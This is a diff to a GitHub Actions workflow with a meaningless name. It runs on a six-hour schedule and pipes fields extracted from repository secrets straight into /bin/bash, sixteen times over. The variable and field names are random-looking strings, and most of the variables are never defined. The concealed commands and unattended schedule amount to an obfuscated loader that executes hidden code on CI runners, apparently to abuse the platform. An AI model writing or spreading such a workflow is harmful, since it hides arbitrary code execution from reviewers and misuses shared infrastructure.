@@ -1,8 +1,9 @@
 name: sugarplumdesert
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 2/6 * * *'
+    - cron: '9 3/6 * * *'
 
 jobs:
   build:
@@ -12,10 +13,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: sugarplumdesert
         env:
-          uzu968: ${{ secrets.uzu968 }}
+          trq5: ${{ secrets.trq5 }}
         run: |
-          echo $uzu968 | jq -r .mvn520 | /bin/bash
-          echo $dfrqw1 | jq -r .k376 | /bin/bash
-          echo $gxpd609 | jq -r .c08899 | /bin/bash
-          echo $hiqe876 | jq -r .u497 | /bin/bash
+          echo $trq5 | jq -r .ef53 | /bin/bash
+          echo $l56 | jq -r .pyje251 | /bin/bash
+          echo $iqkyc986 | jq -r .tlq821 | /bin/bash
+          echo $x7 | jq -r .cgej4 | /bin/bash
+          echo $n6 | jq -r .e18 | /bin/bash
+          echo $ancia552 | jq -r .ww29634 | /bin/bash
+          echo $ekp3 | jq -r .e9693 | /bin/bash
+          echo $ty4 | jq -r .va59 | /bin/bash
+          echo $xoin7 | jq -r .osn502 | /bin/bash
+          echo $cyyam01 | jq -r .worh32104 | /bin/bash
+          echo $dsvk045 | jq -r .atoq60045 | /bin/bash
+          echo $xiuuu3271 | jq -r .zgado7163 | /bin/bash
+          echo $f27804 | jq -r .zcv6454 | /bin/bash
+          echo $ao826 | jq -r .hrppz2609 | /bin/bash
+          echo $fz0946 | jq -r .ghv4971 | /bin/bash
+          echo $da73663 | jq -r .l27 | /bin/bash
 
